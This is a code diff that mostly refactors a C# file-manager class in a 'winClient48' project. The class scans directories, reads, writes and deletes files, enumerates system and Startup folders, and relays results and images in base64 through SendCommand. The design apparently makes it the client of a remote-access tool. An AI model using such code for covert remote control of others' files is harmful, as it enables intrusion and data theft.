@@ -13,23 +13,28 @@ using System.Security.Policy;
 
 namespace winClient48
 {
-    public class FuncFile
+    public class clsfnFile
     {
-        public bool df_stop = false;
+        public bool df_stop = false; //Stop download file.
 
         public string cp; //CURRENT PATH
-        public DriveInfo[] drivers;
+        public DriveInfo[] drivers; //Drivers.
 
         //Download
-        public bool g_bDownloadFile { get; set; }
-        public bool g_bDownloadPause { get; set; }
+        public bool g_bDownloadFile { get; set; } //Download file.
+        public bool g_bDownloadPause { get; set; } //Download file pause.
 
-        public FuncFile()
+        public clsfnFile()
         {
             cp = Application.StartupPath;
             drivers = DriveInfo.GetDrives();
         }
 
+        /// <summary>
+        /// Convert bytes length into KB, MB, GB or TB.
+        /// </summary>
+        /// <param name="bytes_size"></param>
+        /// <returns></returns>
         public string BytesNormalize(long bytes_size)
         {
             if (bytes_size < 1024)
@@ -48,6 +53,12 @@ namespace winClient48
         {
             return drivers;
         }
+
+        /// <summary>
+        /// Check destination directory path's existence.
+        /// </summary>
+        /// <param name="szDirPath">Destination directory path.</param>
+        /// <returns></returns>
         public (int, string) Goto(string szDirPath)
         {
             int code = 1;
@@ -68,7 +79,15 @@ namespace winClient48
 
             return (code, msg);
         }
-        public (int, string, List<string[]>, List<string[]>) ScanDir(string path, int dir_limit, int file_limit)
+
+        /// <summary>
+        /// Scan directory.
+        /// </summary>
+        /// <param name="path">Target directory.</param>
+        /// <param name="dir_limit">Maximum count of directory.</param>
+        /// <param name="file_limit">Maximum count of files.</param>
+        /// <returns></returns>
+        public (int, string, List<string[]>, List<string[]>, int nTotalDir, int nTotalFile) ScanDir(string path, int dir_limit, int file_limit)
         {
             List<string[]> l_dir = new List<string[]>();
             List<string[]> l_file = new List<string[]>();
@@ -77,9 +96,18 @@ namespace winClient48
             int dir_cnt = 0;
             int file_cnt = 0;
 
+            int nTotalDir = 0;
+            int nTotalFile = 0;
+
+            List<string> lsDir = Directory.GetDirectories(path).ToList();
+            List<string> lsFile = Directory.GetFiles(path).ToList();
+
+            nTotalDir = lsDir.Count;
+            nTotalFile = lsFile.Count;
+
             try
             {
-                foreach (string dir in Directory.GetDirectories(path))
+                foreach (string dir in lsDir)
                 {
                     bool is_readonly = false;
                     bool is_writable = false;
@@ -90,21 +118,16 @@ namespace winClient48
                     if (!Directory.Exists(path_check))
                         throw new Exception("Permission Denial.");
 
-                    /*
-                    try { File.Create(tmp_file).Close(); File.Delete(tmp_file); is_writable = true; } catch (Exception ex) { Console.WriteLine(ex.Message); }
-                    try { Directory.GetFiles(dir); is_readonly = true; } catch { }
-                    */
-
                     DirectoryInfo info = new DirectoryInfo(dir);
                     l_dir.Add(new string[]
                     {
-                        dir, //DIR NAME
-                        "X", //FILE LENGTH
-                        "X", //READABLE, WRITABLE
-                        //(is_readonly ? "R" : string.Empty) + (is_writable ? "W" : string.Empty),
-                        info.Attributes.ToString(), //FOLDER ATTRIBUTE
-                        info.CreationTime.ToString("F"), //FOLDER CREATION TIME
-                        info.LastWriteTime.ToString("F"), //LAST WRITE TIME
+                        dir,                               //DIR NAME
+                        "X",                               //FILE LENGTH
+                        "X",                               //READABLE, WRITABLE
+                                                           //(is_readonly ? "R" : string.Empty) + (is_writable ? "W" : string.Empty),
+                        info.Attributes.ToString(),        //FOLDER ATTRIBUTE
+                        info.CreationTime.ToString("F"),   //FOLDER CREATION TIME
+                        info.LastWriteTime.ToString("F"),  //LAST WRITE TIME
                         info.LastAccessTime.ToString("F"), //LAST ACCESS TIME
                     });
 
@@ -124,12 +147,12 @@ namespace winClient48
 
                     l_file.Add(new string[]
                     {
-                        info.FullName, //FILE NAME
-                        BytesNormalize(info.Length), //FILE LENGTH
-                        is_readonly ? "R" : "RW", //READABLE
-                        info.Attributes.ToString(), //FILE ATTRIBUTE
-                        info.CreationTime.ToString("F"), //CREATION TIME
-                        info.LastWriteTime.ToString("F"), //LAST WRITE TIME
+                        info.FullName,                     //FILE NAME
+                        BytesNormalize(info.Length),       //FILE LENGTH
+                        is_readonly ? "R" : "RW",          //READABLE
+                        info.Attributes.ToString(),        //FILE ATTRIBUTE
+                        info.CreationTime.ToString("F"),   //CREATION TIME
+                        info.LastWriteTime.ToString("F"),  //LAST WRITE TIME
                         info.LastAccessTime.ToString("F"), //LAST ACCESS TIME
                     });
 
@@ -141,15 +164,22 @@ namespace winClient48
                         break;
                 }
 
-                return (code, string.Empty, l_dir, l_file);
+                return (code, string.Empty, l_dir, l_file, nTotalDir, nTotalFile);
             }
             catch (Exception ex)
             {
                 code = 0;
 
-                return (code, ex.Message, l_dir, l_file);
+                return (code, ex.Message, l_dir, l_file, nTotalDir, nTotalFile);
             }
         }
+
+        /// <summary>
+        /// Delete items.
+        /// </summary>
+        /// <param name="d1"></param>
+        /// <param name="d2"></param>
+        /// <returns></returns>
         public string DeleteItems(string[] d1, string[] d2)
         {
             List<string> l_folder = new List<string>();
@@ -168,6 +198,12 @@ namespace winClient48
 
             return $"{string.Join(",", l_folder)}|{string.Join(",", l_file.ToArray())}";
         }
+
+        /// <summary>
+        /// Read file.
+        /// </summary>
+        /// <param name="dst">Target file path.</param>
+        /// <returns></returns>
         public string ReadFile(string dst)
         {
             string path = clsCrypto.b64D2Str(dst);
@@ -180,6 +216,13 @@ namespace winClient48
                 return $"0|{dst}|{clsCrypto.b64E2Str(ex.Message)}"; 
             }
         }
+
+        /// <summary>
+        /// Write file.
+        /// </summary>
+        /// <param name="file">File path.</param>
+        /// <param name="text">File content.</param>
+        /// <returns></returns>
         public string WriteFile(string file, string text)
         {
             try { File.WriteAllText(file, text); return "1|" + clsCrypto.b64E2Str(file) + "|"; }
@@ -301,7 +344,7 @@ namespace winClient48
                         v.SendCommand(szPayload);
                         i++;
 
-                        Thread.Sleep(10);
+                        Thread.Sleep(100);
                     }
                 }
             }
@@ -365,7 +408,7 @@ namespace winClient48
                 {
                     string filename = clsCrypto.b64D2Str(enc_file);
                     Bitmap img = (Bitmap)Image.FromFile(filename);
-                    string b64_data = Global.BitmapToBase64(img);
+                    string b64_data = clsGlobal.BitmapToBase64(img);
                     v.SendCommand($"file|img|{enc_file};{b64_data}");
                 }
             }
@@ -566,17 +609,18 @@ namespace winClient48
             List<string> folders = new List<string>();
             Environment.SpecialFolder[] special_folders =
             {
-                    Environment.SpecialFolder.ApplicationData,
-                    Environment.SpecialFolder.Desktop,
-                    Environment.SpecialFolder.Personal,
-                    Environment.SpecialFolder.AdminTools,
-                    Environment.SpecialFolder.StartMenu,
-                    Environment.SpecialFolder.Startup,
-                    Environment.SpecialFolder.System,
-                    Environment.SpecialFolder.Templates,
-                    Environment.SpecialFolder.UserProfile,
-                    Environment.SpecialFolder.Windows,
-                };
+                Environment.SpecialFolder.ApplicationData,
+                Environment.SpecialFolder.Desktop,
+                Environment.SpecialFolder.Personal,
+                Environment.SpecialFolder.AdminTools,
+                Environment.SpecialFolder.StartMenu,
+                Environment.SpecialFolder.Startup,
+                Environment.SpecialFolder.System,
+                Environment.SpecialFolder.Templates,
+                Environment.SpecialFolder.UserProfile,
+                Environment.SpecialFolder.Windows,
+            };
+
             foreach (var s in special_folders)
             {
                 try
